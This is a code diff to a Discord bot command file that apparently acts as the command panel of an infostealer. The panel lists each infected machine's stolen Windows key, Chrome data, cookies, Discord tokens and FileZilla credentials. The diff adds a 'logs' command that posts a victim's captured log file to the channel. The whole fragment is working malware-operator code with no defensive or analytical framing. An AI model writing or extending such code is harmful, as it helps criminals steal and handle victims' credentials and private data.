@@ -131,7 +131,7 @@ exports.run = (client, message, args) => {
                             **Architecture**: ${element.architecture}
                             **Boot Time**: ${element.bootTime}
                             **Memory**: ${element.memory}
-                            **Available Info**: \`Windows Key ${winKey}\` \`Chrome ${chromeLength}\` \`Cookies ${cookieLength}\` \`Discord ${tokensLength}\` \`FileZilla ${filezillaLength}\``,
+                            **Available Info**: \`Windows Key ${winKey}\` \`Chrome ${chromeLength}\` \`Cookies ${cookieLength}\` \`Discord ${tokensLength}\` \`FileZilla ${filezillaLength}\` \`Logs ${element.logSize}\``,
                     })
                     .setThumbnail(
                         `https://www.countryflags.io/${element.countryCode}/flat/64.png`
@@ -313,6 +313,35 @@ exports.run = (client, message, args) => {
                     message.channel.send("Client not found");
                 }
             });
+        } else if (args[1] == "logs") {
+            db.Bots.findAll({
+                where: {
+                    [Op.or]: [
+                        {
+                            id: args[0],
+                        },
+                        {
+                            tag: args[0],
+                        },
+                    ],
+                },
+            }).then(async (result) => {
+                if (result.length > 0) {
+                    const logPath = "./server/logs/" + result[0].identifier + ".txt";
+                    if (fs.existsSync(logPath)) {
+                        message.channel.send(
+                            new Discord.MessageAttachment(
+                                logPath,
+                                "logs.txt"
+                            )
+                        );
+                    } else {
+                        message.channel.send("Logs not found")
+                    }
+                } else {
+                    message.channel.send("Client not found");
+                }
+            })
         } else {
             message.channel.send("Invalid argument");
         }
